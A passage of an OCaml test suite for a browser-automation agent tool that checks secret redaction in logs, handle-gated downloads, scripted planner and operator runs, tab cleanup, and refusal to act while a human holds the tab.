      let h = result (run "alice" (P.New { url = None; label = None })) |> tab in
      let got =
        result (run "alice" (P.Text { tab = h; index = None; max_chars = None }))
      in
      Alcotest.(check string)
        "scripted page text" secret_text
        (match get "text" got with `String s -> s | _ -> Alcotest.fail "text reply");
      let missing =
        match P.Handle.of_string "t_00000000000000000000000000000000" with
        | Ok x -> x
        | Error e -> Alcotest.fail e
      in
      (* The new reads, on a live tab: the results carry the secrets to the handle holder, and no
         journal line may. *)
      Fake.on_method (fake ()) "Network.getCookies" (fun _ ->
          obj
            [
              ( "cookies",
                `List
                  [
                    obj
                      [
                        ("name", str "sid");
                        ("value", str secret_cookie);
                        ("domain", str "example.com");
                        ("path", str "/");
                        ("expires", `Int (-1));
                        ("httpOnly", `Bool true);
                        ("secure", `Bool true);
                      ];
                  ] );
            ]);
      Fake.emit ~session:"session-1" (fake ()) ~method_:"Network.requestWillBeSent"
        ~params:
          (obj
             [
               ("requestId", str "leak-1");
               ("timestamp", `Float 1.);
               ("type", str "Fetch");
               ( "request",
                 obj
                   [
                     ("url", str ("https://example.com/" ^ secret_request));
                     ("method", str "GET");
                     ("headers", obj [ ("Authorization", str secret_request) ]);
                   ] );
             ]);
      (* Wait for the event without the journal: only the one command below is anchored. *)
      let rec await_ring n =
        match
          Leash.Tabs.net tabs
            { tab = h; match_ = Some secret_request; limit = None; type_ = None }
        with
        | Ok { requests = _ :: _ } -> ()
        | _ ->
            if n = 0 then Alcotest.fail "hard-xg6y the ring never saw the request"
            else (
              Eio.Fiber.yield ();
              await_ring (n - 1))
      in
      await_ring 10_000;
      let listed =
        result
          (run "alice"
             (P.Net { tab = h; match_ = Some secret_request; limit = None; type_ = None }))
      in
      Alcotest.(check bool)
        "the handle holder is given the request's url" true
        (contains (Yojson.Safe.to_string listed) secret_request);
      let request_data =
        result (run "alice" (P.Net_request { tab = h; id = "leak-1" }))
      in
      Alcotest.(check bool)
        "the handle holder is given the request's headers" true
        (contains (Yojson.Safe.to_string request_data) secret_request);
      let jar = result (run "alice" (P.Cookies { tab = h })) in
      Alcotest.(check bool)
        "the handle holder is given the cookie's value" true
        (contains (Yojson.Safe.to_string jar) secret_cookie);
      let snap =
        match P.Snapshot_id.of_string "s_diagnostics" with
        | Ok x -> x
        | Error e -> Alcotest.fail e
      in
      let direction =
        match P.Direction.of_string "down" with Ok x -> x | Error e -> Alcotest.fail e
      in
      let answer =
        match P.Answer.of_string "accept" with Ok x -> x | Error e -> Alcotest.fail e
      in
      let commands =
        P.
          [
            List_tabs;
            Status;
            Take { url = None; title = None; label = Some "missing" };
            Close { tab = missing };
            Snap
              {
                tab = missing;
                match_ = None;
                limit = None;
                offset = None;
                with_image = None;
              };
            Shot { tab = missing; path = "/tmp/no-shot"; full_page = None };
            Debug { tab = missing; limit = None; clear = None };
            Eval
              {
                tab = missing;
                expression = "return argument";
                argument = Some (str api_key);
                index = None;
                snapshot = None;
              };
            Nav { tab = missing; url };
            Net
              { tab = missing; match_ = Some secret_request; limit = None; type_ = None };
            Net_body { tab = missing; id = secret_request };
            Net_request { tab = missing; id = secret_request };
            Upload { tab = missing; snapshot = snap; index = 0; paths = [ secret_path ] };
            Hover
              {
                tab = missing;
                snapshot = snap;
                index = 0;
                snap = None;
                match_ = None;
                limit = None;
              };
            Cookies { tab = missing };
            Storage
              {
                tab = missing;
                area = Leash.Protocol.Storage_area.of_string "local" |> Result.get_ok;
              };
            Click
              {
                tab = missing;
                snapshot = snap;
                index = 0;
                snap = None;
                match_ = None;
                limit = None;
              };
            Fill
              {
                tab = missing;
                snapshot = snap;
                index = 0;
                text = secret_fill;
                snap = None;
                match_ = None;
                limit = None;
              };
            Press
              {
                tab = missing;
                snapshot = snap;
                index = None;
                key = "Enter";
                snap = None;
                match_ = None;
                limit = None;
              };
            Select
              {
                tab = missing;
                snapshot = snap;
                index = 0;
                option = 0;
                snap = None;
                match_ = None;
                limit = None;
              };
            Scroll { tab = missing; direction; index = None };
            Wait
              {
                tab = missing;
                until =
                  {
                    url_prefix = None;
                    text = None;
                    index_gone = None;
                    dialog = None;
                    changed_since = None;
                  };
                timeout_ms = Some 0;
              };
            Dialog { tab = missing; answer; text = None };
            Handoff { tab = missing; reason = "test"; timeout_s = Some 1 };
            Resume { tab = missing };
            Drive
              {
                tab = Some missing;
                mission = "test";
                max_steps = None;
                start_url = None;
                max_procedures = Some 1;
                deadline_s = Some 1;
                dry_run = Some true;
                expect = None;
                out = None;
                secrets = [];
              };
          ]
      in
      List.iter (fun command -> ignore (run "alice" command)) commands;
      let records = L.Memory.records memory in
      let anchors = List.filter (fun r -> r.L.msg = "control command") records in
      Alcotest.(check int)
        "one anchor per command"
        (5 + List.length commands)
        (List.length anchors);
      let expected_commands =
        P.New { url = None; label = None }
        :: P.Text { tab = h; index = None; max_chars = None }
        :: P.Net { tab = h; match_ = Some secret_request; limit = None; type_ = None }
        :: P.Net_request { tab = h; id = "leak-1" }
        :: P.Cookies { tab = h }
        :: commands
      in
      List.iter2
        (fun (_position, command) record ->
          let context key = List.assoc_opt key record.L.context in
          Alcotest.(check (option string))
            "cmd"
            (Some (P.command_name command))
            (context "cmd");
          Alcotest.(check (option string)) "no capability in journal" None (context "tab"))
        (List.mapi (fun position command -> (position, command)) expected_commands)
        anchors;
      let contains text sub =
        let rec search i =
          i + String.length sub <= String.length text
          && (String.sub text i (String.length sub) = sub || search (i + 1))
        in
        search 0
      in
      List.iter
        (fun record ->
          let line = L.to_string record in
          List.iter
            (fun secret ->
              Alcotest.(check bool) ("redacted " ^ secret) false (contains line secret))
            [
              secret_fill;
              secret_text;
              api_key;
              userinfo;
              secret_request;
              secret_cookie;
              secret_path;
            ])
        records)

(* run-ykq4: no Chrome process; browser-level events and the handle-gated
   protocol response are driven by the scripted CDP peer. *)
let download_events
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps ~download_dir:"/tmp/leash-scripted-downloads" (fun _ _ _ tabs fake ->
      let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
      let fake = fake () in
      let behaviors =
        List.filter
          (fun req -> get "method" req = str "Browser.setDownloadBehavior")
          (Fake.received fake)
      in
      Alcotest.(check int) "run-ykq4 behavior set" 1 (List.length behaviors);
      let setup_closed = ref false in
      List.iter
        (fun req ->
          if get "method" req = str "Target.closeTarget" then
            setup_closed :=
              get "targetId" (get "params" req) = str "download-setup-target";
          if get "method" req = str "Browser.setDownloadBehavior" then
            Alcotest.(check bool)
              "daily-c4cl history bootstrap precedes override" true !setup_closed)
        (Fake.received fake);
      Fake.emit fake ~method_:"Target.attachedToTarget"
        ~params:
          (obj
             [
               ("sessionId", str "download-setup-session");
               ( "targetInfo",
                 obj
                   [
                     ("targetId", str "download-setup-target");
                     ("type", str "page");
                     ("url", str "chrome://downloads/");
                     ("title", str "Downloads");
                   ] );
             ]);
      for _ = 1 to 20 do
        Eio.Fiber.yield ()
      done;
      (match get "tabs" (result (request tabs "alice" P.List_tabs)) with
      | `List tabs ->
          Alcotest.(check int)
            "daily-c4cl setup target never registered" 1 (List.length tabs)
      | _ -> Alcotest.fail "tabs list missing");
      let params = get "params" (List.hd behaviors) in
      Alcotest.(check string)
        "run-ykq4 allow" "allow"
        (match get "behavior" params with `String s -> s | _ -> "");
      Alcotest.(check bool)
        "run-ykq4 events enabled" true
        (get "eventsEnabled" params = `Bool true);
      let fixture = Yojson.Safe.from_file "fixtures/download-chrome.json" in
      let begin_ = get "downloadWillBegin" fixture in
      let frame = get "frameId" (get "params" begin_) in
      Fake.emit ~session:"session-1" fake ~method_:"Page.frameNavigated"
        ~params:
          (obj [ ("frame", obj [ ("id", frame); ("url", str "https://example.com/") ]) ]);
      Fake.emit fake ~method_:"Browser.downloadWillBegin" ~params:(get "params" begin_);
      (* run-ykq4, L34 live PDF: the same GUID can arrive twice. One file must
         still have one handle-gated record. *)
      Fake.emit fake ~method_:"Browser.downloadWillBegin" ~params:(get "params" begin_);
      (match get "downloadProgress" fixture with
      | `List events ->
          List.iter
            (fun event ->
              Fake.emit fake ~method_:"Browser.downloadProgress"
                ~params:(get "params" event))
            events
      | _ -> Alcotest.fail "invalid Chrome download fixture");
      let rec done_ attempts =
        let data = result (request tabs "alice" (P.Downloads { tab = h })) in
        match get "downloads" data with
        | `List [ download ] when get "state" download = str "completed" -> download
        | _ when attempts > 0 ->
            Eio.Fiber.yield ();
            done_ (attempts - 1)
        | _ -> Alcotest.fail "run-ykq4 browser events not observed"
      in
      let download = done_ 1000 in
      Alcotest.(check string)
        "run-ykq4 PDF mime" "application/pdf"
        (match get "mime" download with `String s -> s | _ -> "");
      Alcotest.(check string)
        "run-ykq4 path" "<managed-profile>/downloads/sample.pdf"
        (match get "path" download with `String s -> s | _ -> "");
      ignore (result (request tabs "bob" (P.Downloads { tab = h })));
      let bad =
        match P.Handle.of_string "t_not_a_tab" with
        | Ok h -> h
        | Error e -> Alcotest.fail e
      in
      check_code "hand-scaz downloads need the handle" "unknown-tab"
        (request tabs "bob" (P.Downloads { tab = bad })))

let optional_otlp ~(caps : < Ox_caps.Cap.random ; .. >) () =
  Ox_test.run (fun env sw ->
      let telemetry =
        Leash.Telemetry.create ~caps ~sw ~net:env#net ~clock:env#clock
          ~endpoint:"http://127.0.0.1:4318" ~headers:[]
      in
      Alcotest.(check int) "enabled reporter" 1 (List.length telemetry.Ox_app.reporters);
      let id = Option.get telemetry.Ox_app.span_ids () in
      Alcotest.(check int) "trace id length" 32 (String.length id))

(* ---------- L31: the run over the fake browser ----------

   run-9ypy run-4j1v run-snk4 run-shgh run-7blx run-fwl8: the whole control seam — a real
   request through {!Leash.Control.handle}, the fake CDP peer, the modelled upper levels
   scripted and the operator level's decision scripted — so the loop is proven without a
   model and without a browser. The page is L30's measured state: the successful Added!
   modal on the offer URL, whose playbook kind is [post-add] because its text marker takes
   priority over the offer URL matcher. *)

module Jev = Leash__Jev_request

let modal_text = "Added! Your product has been added to cart. View Cart"
let product_url = "https://automationexercise.com/product_details/1"
let decoded = function Ok reply -> result reply | Error why -> Alcotest.fail why
let reply_of = function Ok reply -> reply | Error why -> Alcotest.fail why

let operation name =
  match P.Operation.of_string name with Ok x -> x | Error _ -> assert false

let decide_done ~deadline:_ (_ : Jev.request) =
  Ok
    Jev.
      {
        operation = operation "done";
        script = None;
        index = None;
        option = None;
        confidence = 1.;
        target_confidence = None;
        operation_probabilities = [ ("done", 1.) ];
        target_probabilities = [];
        targets = [];
      }

let run_wire ?(who = "alice") ?expect ?tab ?max_steps ?deadline_s mission =
  P.encode_request
    {
      command =
        P.Drive
          {
            tab;
            mission;
            max_steps;
            start_url = None;
            max_procedures = None;
            deadline_s;
            dry_run = None;
            expect;
            out = None;
            secrets = [];
          };
    }
  |> Yojson.Safe.to_string

(* The page the fake CDP peer serves: the recorded sh*ap*es of the unlabelled-controls
   fixture for the tree and the modal's text for the document. *)
let page_script fake fixture text =
  Fake.on_method fake "Accessibility.getFullAXTree" (fun _ -> get "ax" fixture);
  Fake.on_method fake "DOMSnapshot.captureSnapshot" (fun _ -> get "dom" fixture);
  Fake.on_method fake "Page.getFrameTree" (fun _ -> get "frameTree" fixture);
  Fake.on_method fake "Runtime.evaluate" (page_evaluate ~text fixture);
  Fake.on_method fake "Runtime.callFunctionOn" (fun _ ->
      obj
        [
          ( "result",
            obj
              [
                ( "value",
                  obj [ ("y", `Int 0); ("viewport", `Int 400); ("height", `Int 1000) ] );
              ] );
        ])

(* The registry reads the document's title and committed URL from this query once the load
   is done, which is where the run's page kind comes from. *)
let document_at ~title ~url fake =
  Fake.on_method fake "Target.getTargetInfo" (fun _ ->
      obj
        [
          ( "targetInfo",
            obj
              [
                ("targetId", str "target-1");
                ("type", str "page");
                ("title", str title);
                ("url", str url);
              ] );
        ]);
  Fake.on_method fake "Page.navigate" (fun request ->
      let session =
        match get "sessionId" request with `String s -> s | _ -> assert false
      in
      Fake.emit ~session fake ~method_:"Target.targetInfoChanged"
        ~params:
          (obj
             [
               ( "targetInfo",
                 obj
                   [
                     ("targetId", str "target-1");
                     ("type", str "page");
                     ("title", str title);
                     ("url", str url);
                   ] );
             ]);
      Fake.emit ~session fake ~method_:"Page.loadEventFired"
        ~params:(Fake.event "Page.loadEventFired");
      obj [])

(* The rig's clocks are Eio_mock's, so a run whose expectation wait sleeps needs the
   virtual clock moved while it works: this fiber advances it by 100 ms at a time until the
   request is answered. The wait's own timeout bounds it (run-xflk). *)
let run_mission
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun env sw _ tabs fake ->
      let f = fake () in
      let fixture = fixture "unlabelled-controls-chrome.json" in
      page_script f fixture modal_text;
      document_at ~title:"Blue Top" ~url:product_url f;
      let playbook =
        match
          Leash.Playbook.load ~caps "../examples/playbooks/automationexercise.com"
        with
        | Ok book -> book
        | Error why -> Alcotest.fail why
      in
      let h =
        result (request tabs "alice" (P.New { url = Some product_url; label = None }))
        |> tab
      in
      let questions = ref [] in
      let answers = [ "automationexercise.com"; "add-to-cart"; "DONE" ] in
      let base = levels_with answers questions in
      let scored = ref 0 in
      let pilot_requests = ref [] in
      let levels =
        Run.
          {
            base with
            score =
              (fun ~deadline ~sentence ~state ->
                incr scored;
                Leash__Model_usage.start "verifier";
                let result = base.score ~deadline ~sentence ~state in
                Leash__Model_usage.report "verifier" (Some 0.05);
                result);
            plan =
              (fun ~deadline request ->
                pilot_requests := request :: !pilot_requests;
                Leash__Model_usage.start "planner";
                Leash__Model_usage.report "planner" (Some 0.3);
                Leash__Model_usage.start "planner";
                Leash__Model_usage.report "planner" (Some 0.07);
                if List.length !pilot_requests > 2 then
                  Ok
                    Run.
                      {
                        answer = Fail "mission expectations did not pass";
                        expect = [];
                        reasoning_summary = None;
                        secrets_for_operator = [];
                        usage = None;
                      }
                else base.plan ~deadline request);
          }
      in
      let decide ~deadline request =
        Leash__Model_usage.start "operator";
        let reply = decide_done ~deadline request in
        Leash__Model_usage.report "operator" (Some 0.4);
        reply
      in
      let reply =
        with_ticking_clock env sw (fun () ->
            Leash.Control.handle ~model:"fixture-model" ~levels ~installed:[ playbook ]
              ~decide tabs
              (run_wire ~tab:h
                 ~expect:[ "checkout looks trustworthy"; "the page is cart" ]
                 "add Blue Top to the cart")
            |> Yojson.Safe.from_string |> P.decode_reply)
      in
      let body = decoded reply in
      let by_kind = get "model_calls_by_kind" (get "data" body) in
      Alcotest.(check bool)
        "extr-5x9e operator JEV calls counted" true
        (match
           List.assoc_opt "operator" (match by_kind with `Assoc xs -> xs | _ -> [])
         with
        | Some (`Int n) -> n > 0
        | _ -> false);
      Alcotest.(check bool)
        "extr-5x9e each retry counted separately" true
        (get "planner" by_kind = `Int 6);
      Alcotest.(check bool)
        ("extr-5x9e verifier calls counted " ^ string_of_int !scored)
        true
        (List.assoc_opt "verifier" (match by_kind with `Assoc xs -> xs | _ -> [])
         = Some (`Int !scored)
        && !scored > 0);
      Alcotest.(check bool)
        "extr-5x9e retry and verifier costs summed" true
        (match get "model_cost" body with
        | `Float n ->
            Float.abs
              (n
              -. (1.11
                 +. (float_of_int !scored *. 0.05)
                 +. 0.4
                    *.
                    match get "operator" by_kind with
                    | `Int n -> float_of_int n
                    | _ -> 0.))
            < 0.00001
        | _ -> false);
      Alcotest.(check string)
        "run-4j1v the Added! modal is not DONE" "failed"
        (match get "status" body with `String s -> s | _ -> "");
      (match get "procedures" body with
      | `List (entry :: _) ->
          Alcotest.(check string)
            "pilot-eu1c the selected candidate leg is visible" "add-to-cart"
            (match get "slug" entry with `String s -> s | _ -> "");
          Alcotest.(check string)
            "pilot-eu1c leg DONE returns to pilot" "done"
            (match get "outcome" entry with `String s -> s | _ -> "")
      | _ -> Alcotest.fail "run-9ypy the trace has no procedure");
      (match get "mission_expectations" body with
      | `List [ _; expectation ] ->
          Alcotest.(check bool)
            "run-4j1v the mission's own expectation was verified and did not hold" false
            (match get "passed" expectation with `Bool b -> b | _ -> true);
          Alcotest.(check string)
            "run-4j1v the expectation is the mission's" "the page is cart"
            (match get "sentence" expectation with `String s -> s | _ -> "")
      | _ -> Alcotest.fail "run-4j1v the mission expectations are missing");
      (match get "planner_turns" body with
      | `List [ first; attempt; last ] ->
          Alcotest.(check bool)
            "pilot decides again after completion guard refuses" true
            (get "answer" first = str "leg"
            && get "answer" attempt = str "done"
            && get "answer" last = str "fail")
      | _ -> Alcotest.fail "pilot decisions missing");
      let initial = List.hd (List.rev !pilot_requests) in
      Alcotest.(check bool)
        "pilot gets current kind" true
        (initial.Run.page_kind = Some "post-add");
      Alcotest.(check bool)
        "pilot receives page evidence from turn one" true
        (String.length initial.text > 0);
      Alcotest.(check int)
        "mission never invokes legacy selector" 0 (List.length !questions);
      (* run-shgh: the step went through the same service path [drive] uses, and nothing
         acted on the page: the decision was [done]. *)
      let methods =
        Fake.received f
        |> List.filter_map (fun json ->
            match field "method" json with Some (`String name) -> Some name | _ -> None)
      in
      Alcotest.(check bool)
        "run-shgh the step drove the operator level" true
        (List.mem "Accessibility.getFullAXTree" methods);
      Alcotest.(check bool)
        "run-d82w nothing was dispatched" false
        (List.mem "Input.dispatchMouseEvent" methods))

(* run-fwl8: a run starts from a state it can act in. *)
let drive_temporary_cleanup
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  List.iter
    (fun outcome ->
      rig ~caps (fun env sw _ tabs fake ->
          let f = fake () in
          page_script f (fixture "unlabelled-controls-chrome.json") "Example content";
          document_at ~title:"Example Domain" ~url:"https://example.com/" f;
          let decide ~deadline request =
            if outcome = "model-error" then
              Error
                (P.make_error
                   (Result.get_ok (P.Error_code.of_string "model-unavailable"))
                   ~message:"scripted provider failure")
            else
              Result.map
                (fun (d : Leash__Jev_request.decision) ->
                  { d with operation = Result.get_ok (P.Operation.of_string outcome) })
                (decide_done ~deadline request)
          in
          let reply =
            with_ticking_clock env sw (fun () ->
                Leash.Control.handle ~model:"fixture-model" ~installed:[] ~decide
                  ~levels:
                    (levels_with
                       ~plan:
                         Run.
                           {
                             answer = Fail "scripted stop";
                             expect = [];
                             reasoning_summary = None;
                             secrets_for_operator = [];
                             usage = None;
                           }
                       [] (ref []))
                  tabs
                  (run_wire "Open https://example.com and inspect the page"))
            |> Yojson.Safe.from_string |> P.decode_reply |> reply_of
          in
          (match (outcome, reply) with
          | "model-error", P.Success body ->
              Alcotest.(check string)
                "pilot-rdjv provider failure returns before pilot fail" "failed"
                (match get "status" body with `String s -> s | _ -> "");
              let error =
                match P.error_of_yojson (get "error" (get "operator_state" body)) with
                | Ok error -> error
                | Error why -> Alcotest.fail why
              in
              Alcotest.(check string)
                "daily-9ggi original error retained" "model-unavailable"
                (P.Error_code.to_string error.P.code)
          | _, P.Success body ->
              Alcotest.(check string)
                "pilot-rdjv explicit pilot failure closes the mission" "failed"
                (match get "status" body with `String s -> s | _ -> "")
          | _ -> Alcotest.fail "daily-9ggi unexpected drive reply");
          let listed = result (request tabs "alice" P.List_tabs) |> get "tabs" in
          Alcotest.(check bool)
            "daily-9ggi temporary tab closed on every outcome" true
            (listed = `List [])))
    [ "done"; "blocked"; "model-error" ];
  rig ~caps (fun env sw _ tabs fake ->
      let f = fake () in
      page_script f (fixture "unlabelled-controls-chrome.json") "Example content";
      document_at ~title:"Example Domain" ~url:"https://example.com/" f;
      (match
         with_ticking_clock env sw (fun () ->
             Leash.Control.handle ~model:"fixture-model" ~installed:[]
               ~decide:(fun ~deadline:_ _ -> raise Exit)
               ~levels:(levels_with [] (ref []))
               tabs
               (run_wire "Open https://example.com"))
       with
      | exception Exit -> ()
      | _ -> Alcotest.fail "daily-9ggi expected scripted exception");
      let listed = result (request tabs "alice" P.List_tabs) |> get "tabs" in
      Alcotest.(check bool)
        "daily-9ggi exception closes temporary tab" true
        (listed = `List []));
  rig ~caps ~handoff_timeout_s:1 (fun env sw _ tabs fake ->
      let f = fake () in
      page_script f (fixture "unlabelled-controls-chrome.json") "Sign in";
      document_at ~title:"Sign in" ~url:product_url f;
      let book =
        match
          Leash.Playbook.load ~caps "../examples/playbooks/automationexercise.com"
        with
        | Ok book -> book
        | Error why -> Alcotest.fail why
      in
      let plan =
        Run.
          {
            answer = Handoff "Please sign in with your credentials";
            expect = [];
            reasoning_summary = None;
            secrets_for_operator = [];
            usage = None;
          }
      in
      let levels = levels_with ~plan [ "automationexercise.com"; "DONE" ] (ref []) in
      let body =
        with_ticking_clock env sw (fun () ->
            Leash.Control.handle ~model:"fixture-model" ~installed:[ book ] ~levels
              ~decide:decide_done tabs
              (run_wire
                 "Inspect the catalogue at \
                  https://automationexercise.com/product_details/1")
            |> Yojson.Safe.from_string |> P.decode_reply |> decoded)
      in
      Alcotest.(check bool)
        "notif-oslv bounded handoff expires" true
        (get "status" body = str "handoff-expired");
      let listed = result (request tabs "alice" P.List_tabs) |> get "tabs" in
      Alcotest.(check bool)
        "notif-oslv expired tab preserved without human lock" true
        (match listed with
        | `List [ tab ] -> get "with_human" tab = `Bool false
        | _ -> false);
      Alcotest.(check string)
        "notif-oslv expired handoff cannot resume" "no-handoff"
        (code (request tabs "alice" (P.Resume { tab = tab (get "final" body) })));
      Alcotest.(check bool)
        "notif-oslv expired owned tab remains inspectable" true
        (match get "tabs" (result (request tabs "alice" P.List_tabs)) with
        | `List [ _ ] -> true
        | _ -> false))

(* L53 map-puhi: drive owns only tabs it opened, including terminal limits and handoffs. *)
let drive_tab_lifecycle
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  List.iter
    (fun supplied ->
      List.iter
        (fun outcome ->
          rig ~caps ~handoff_timeout_s:1 (fun env sw _ tabs fake ->
              let f = fake () in
              page_script f (fixture "unlabelled-controls-chrome.json") "Catalogue";
              document_at ~title:"Catalogue" ~url:product_url f;
              let supplied_tab =
                if supplied then
                  Some
                    (tab
                       (result
                          (request tabs "alice"
                             (P.New { url = Some product_url; label = None }))))
                else None
              in
              let installed =
                if outcome = "handoff" then
                  [
                    (match
                       Leash.Playbook.load ~caps
                         "../examples/playbooks/automationexercise.com"
                     with
                    | Ok book -> book
                    | Error why -> Alcotest.fail why);
                  ]
                else []
              in
              let plan =
                Run.
                  {
                    answer =
                      (if outcome = "handoff" then Handoff "Please inspect this"
                       else if outcome = "done" then
                         Done { result = "Complete"; evidence = []; records = [] }
                       else Fail "scripted stop");
                    expect = [];
                    reasoning_summary = None;
                    secrets_for_operator = [];
                    usage = None;
                  }
              in
              let levels =
                levels_with ~plan [ "automationexercise.com"; "DONE" ] (ref [])
              in
              let decide ~deadline request =
                if outcome = "error" then
                  Error
                    (P.make_error
                       (Result.get_ok (P.Error_code.of_string "model-unavailable"))
                       ~message:"provider stopped")
                else (
                  if outcome = "deadline" then Eio.Time.sleep env#clock 2.;
                  Result.map
                    (fun (d : Jev.decision) ->
                      if outcome = "limit" then
                        {
                          d with
                          operation = Result.get_ok (P.Operation.of_string "scroll_down");
                        }
                      else if outcome = "blocked" then
                        {
                          d with
                          operation = Result.get_ok (P.Operation.of_string "blocked");
                        }
                      else d)
                    (decide_done ~deadline request))
              in
              let body =
                with_ticking_clock env sw (fun () ->
                    Leash.Control.handle ~model:"fixture-model" ~installed ~levels ~decide
                      tabs
                      (run_wire ?tab:supplied_tab ~max_steps:1
                         ~deadline_s:(if outcome = "deadline" then 1 else 3600)
                         "Inspect https://automationexercise.com/product_details/1")
                    |> Yojson.Safe.from_string |> P.decode_reply |> decoded)
              in
              Alcotest.(check string)
                ("map-puhi ending " ^ outcome)
                (if outcome = "handoff" then "handoff-expired"
                 else if outcome = "deadline" then "deadline"
                 else if outcome = "done" then "done"
                 else "failed")
                (match get "status" body with `String name -> name | _ -> "");
              let listing () =
                match get "tabs" (result (request tabs "alice" P.List_tabs)) with
                | `List tabs -> tabs
                | _ -> assert false
              in
              Alcotest.(check int)
                "only supplied or handed-off tab remains"
                (if supplied || outcome = "handoff" then 1 else 0)
                (List.length (listing ()));
              if outcome = "handoff" then (
                Alcotest.(check string)
                  "notif-oslv expired handoff released" "no-handoff"
                  (code
                     (request tabs "alice" (P.Resume { tab = tab (get "final" body) })));
                Alcotest.(check int)
                  "notif-oslv expiry preserves owned and supplied tabs" 1
                  (List.length (listing ())))))
        [ "done"; "blocked"; "error"; "limit"; "deadline"; "handoff" ])
    [ false; true ]

let run_refusals
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun env sw _ tabs fake ->
      with_ticking_clock ~tick_ms:1 ~ticks:500_000 env sw (fun () ->
          let f = fake () in
          let fixture = fixture "unlabelled-controls-chrome.json" in
          page_script f fixture "";
          document_at ~title:"A page" ~url:"https://example.com/" f;
          let h =
            result
              (request tabs "alice"
                 (P.New { url = Some "https://example.com/"; label = None }))
            |> tab
          in
          let levels = levels_with [] (ref []) in
          let run ?expect who =
            reply_of
              (P.decode_reply
                 (Yojson.Safe.from_string
                    (Leash.Control.handle ~model:"fixture-model" ~levels ~installed:[]
                       ~decide:decide_done tabs
                       (run_wire ~who ?expect ~tab:h "do the thing"))))
          in
          let bad =
            match P.Handle.of_string "t_not_a_tab" with
            | Ok h -> h
            | Error e -> Alcotest.fail e
          in
          check_code "hand-oyzl a bad handle is unknown" "unknown-tab"
            (reply_of
               (P.decode_reply
                  (Yojson.Safe.from_string
                     (Leash.Control.handle ~model:"fixture-model" ~levels ~installed:[]
                        ~decide:decide_done tabs
                        (run_wire ~tab:bad "do the thing")))));
          (* The human's hold: every command on the tab answers [with-human], a run included. *)
          (match Leash.Tabs.hand_over tabs ~reason:"look at this" h with
          | Ok _ -> ()
          | Error error -> Alcotest.fail error.P.message);
          check_code "run-fwl8 with-human" "with-human" (run "alice");
          (* The following dialog assertion needs the handoff fixture released. *)
          let _resumed_fixture = Leash.Tabs.resume tabs h in
          (* A dialog waiting to be answered: the run refuses to start rather than fight it. *)
          Fake.emit ~session:"session-1" f ~method_:"Page.javascriptDialogOpening"
            ~params:
              (obj
                 [
                   ("type", str "alert");
                   ("message", str "stay here");
                   ("url", str "https://example.com/");
                   ("hasBrowserHandler", `Bool true);
                 ]);
          let rec wait_dialog n =
            if n = 0 then Alcotest.fail "run-fwl8 the dialog event was not delivered"
            else
              match
                Leash.Tabs.snap tabs
                  {
                    tab = h;
                    match_ = None;
                    limit = None;
                    offset = None;
                    with_image = None;
                  }
              with
              | Ok { dialog = Some _; _ } -> ()
              | _ ->
                  Eio.Fiber.yield ();
                  wait_dialog (n - 1)
          in
          wait_dialog 100;
          check_code "run-fwl8 dialog-open" "dialog-open" (run "alice");
          (* daily-9ggi: a mission closes its own tab but preserves a supplied tab. *)
          let opened =
            reply_of
              (P.decode_reply
                 (Yojson.Safe.from_string
                    (Leash.Control.handle ~model:"fixture-model"
                       ~levels:
                         {
                           levels with
                           plan =
                             (fun ~deadline:_ _ ->
                               Ok
                                 Run.
                                   {
                                     answer = Fail "mission needs a URL";
                                     expect = [];
                                     reasoning_summary = None;
                                     secrets_for_operator = [];
                                     usage = None;
                                   });
                         }
                       ~installed:[] ~decide:decide_done tabs (run_wire "learn the thing"))))
          in
          (match opened with
          | P.Failure error -> Alcotest.fail error.P.message
          | P.Success body ->
              Alcotest.(check string)
                "pilot-s954 pilot explains missing URL" "failed"
                (match get "status" body with `String s -> s | _ -> ""));
          let tabs_now = result (request tabs "alice" P.List_tabs) |> get "tabs" in
          Alcotest.(check int)
            "daily-9ggi the run cleaned its tab, supplied tab remains" 1
            (match tabs_now with `List xs -> List.length xs | _ -> 0)))

(* L32 run-rq6i cut-sqlp: the pilot chooses a playbook procedure through the control seam;
   the run writes nothing into the installed playbook. *)
let run_proposal
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  let state = Ox_caps.Cap_stdlib.Filename.temp_file ~caps "leash-run-proposal" "" in
  Ox_caps.Cap_sys.remove ~caps state;
  Ox_caps.Cap_unix.mkdir ~caps state 0o700;
  let previous = Ox_caps.Cap_sys.getenv_opt ~caps "XDG_STATE_HOME" in
  Ox_caps.Cap_unix.putenv ~caps "XDG_STATE_HOME" state;
  Fun.protect
    ~finally:(fun () ->
      Ox_caps.Cap_unix.putenv ~caps "XDG_STATE_HOME" (Option.value ~default:"" previous))
    (fun () ->
      rig ~caps (fun env sw _ tabs fake ->
          let f = fake () in
          let fixture = fixture "unlabelled-controls-chrome.json" in
          page_script f fixture modal_text;
          document_at ~title:"Blue Top" ~url:product_url f;
          (* dune runs a test from its own directory and `dune exec` from the repository
             root; the example resolves from either. *)
          let playbook =
            match
              Leash.Playbook.load ~caps "../examples/playbooks/automationexercise.com"
            with
            | Ok book -> book
            | Error _ -> (
                match
